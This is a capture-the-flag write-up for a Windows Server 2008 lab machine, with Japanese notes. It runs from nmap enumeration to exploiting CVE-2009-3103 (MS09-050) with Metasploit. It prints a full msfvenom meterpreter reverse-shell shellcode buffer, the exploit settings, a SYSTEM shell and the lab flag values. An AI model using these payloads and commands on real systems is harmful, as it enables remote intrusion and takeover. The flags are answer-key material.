---
title: Internal
parent: Proving Grounds Play
grand_parent: Writeups
nav_order: 2
---
# Internal
## WIndows
## Easy

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.201.40
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 07:16 +0900
Nmap scan report for 192.168.201.40
Host is up (0.082s latency).
Not shown: 65405 closed tcp ports (reset), 117 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-05-09T22:18:39+00:00
|_ssl-date: 2026-05-09T22:18:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-01-05T19:52:51
|_Not valid after:  2025-07-07T19:52:51
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-time: 
|   date: 2026-05-09T22:18:39
|_  start_date: 2025-02-20T21:30:47
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-09T15:18:39-07:00
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:c7:38 (VMware)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   80.93 ms 192.168.45.1
2   80.93 ms 192.168.45.254
3   80.98 ms 192.168.251.1
4   81.09 ms 192.168.201.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.67 seconds
```
Target_Name: INTERNAL

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ echo "192.168.201.40 internal" | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.201.40 internal
```

## DNS 53
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ nmap --script dns-zone-transfer,dns-cache-snoop,dns-brute -p 53 internal       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 07:30 +0900
NSE: [dns-zone-transfer] Skipping 'dns-zone-transfer' prerule, 'dnszonetransfer.domain' argument is missing.
Nmap scan report for internal (192.168.201.40)
Host is up (0.086s latency).

PORT   STATE SERVICE
53/tcp open  domain

Host script results:
|_dns-brute: Can't guess domain of "internal"; use dns-brute.domain script argument.

Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ nslookup internal 192.168.201.40 
;; communications error to 192.168.201.40#53: timed out
;; communications error to 192.168.201.40#53: timed out
;; communications error to 192.168.201.40#53: timed out
;; no servers could be reached
```

## HTTP 5357
![](../../../assets/images/Pasted%20image%2020260510090425.png)

## RPC 135
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ rpcclient -U “” -N internal 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ enum4linux -a 192.168.201.40                           
```
Nothing

## SMB 445
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ smbclient -L //internal/         
Protocol negotiation (with timeout 20000 ms) timed out against server internal
```
## Vulneravility Check
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ nmap --script vuln internal                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 08:13 +0900
Nmap scan report for internal (192.168.201.40)
Host is up (0.092s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Nmap done: 1 IP address (1 host up) scanned in 53.08 seconds
```
CVE-2009-3103

## searchexploit
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ searchsploit -m 42080            
    Paper: 
      URL: https://www.exploit-db.com/papers/42080
     Path: /usr/share/exploitdb-papers/docs/turkish/42080-[turkish]-mobile-penetration-testing.pdf
    Codes: N/A
 Verified: False
File Type: PDF document, version 1.3
Copied to: /home/kali/CTF/OffSec/Internal/42080-[turkish]-mobile-penetration-testing.pdf
```
## github
https://github.com/sec13b/ms09-050_CVE-2009-3103/tree/main
![](../../../assets/images/Pasted%20image%2020260510090916.png)
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.218 LPORT=443  EXITFUNC=thread -f python -v shell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of python file: 1929 bytes
shell =  b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f"
shell += b"\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58"
shell += b"\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
shell += b"\xda\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"
```
- -f python 出力フォーマット

Pythonコード形式でシェルコードを出す
exploit scriptにそのまま貼れる
例：

buf =  b"\\xfc\\xe8..."
- -v shell  変数名指定 出力されるシェルコードの変数名を shell にする

## Exploit

## Measploit
```zsh
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.201.40   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.45.218   yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)



View the full module info with the info, or info -d command.
```

```zsh
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
[*] Started reverse TCP handler on 192.168.45.218:443 
[*] 192.168.201.40:445 - Connecting to the target (192.168.201.40:445)...
[*] 192.168.201.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.201.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (199238 bytes) to 192.168.201.40
[*] Meterpreter session 1 opened (192.168.45.218:443 -> 192.168.201.40:49159) at 2026-05-10 09:47:34 +0900

meterpreter > shell
Process 2200 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

---
# Administrator Flag
```powershell
C:\Windows\system32>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  08:51 PM    <DIR>          .
02/03/2011  08:51 PM    <DIR>          ..
05/20/2016  10:26 PM                32 network-secret.txt
05/09/2026  05:46 PM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,111,130,624 bytes free

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.201.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.201.254

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

```powershell
C:\Windows\system32>type C:\Users\Administrator\Desktop\network-secret.txt
type C:\Users\Administrator\Desktop\network-secret.txt
9be35de7610eb55b8c1aeb6e18bf4c9f
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
94c34f421323592c827a43c16a163214
```
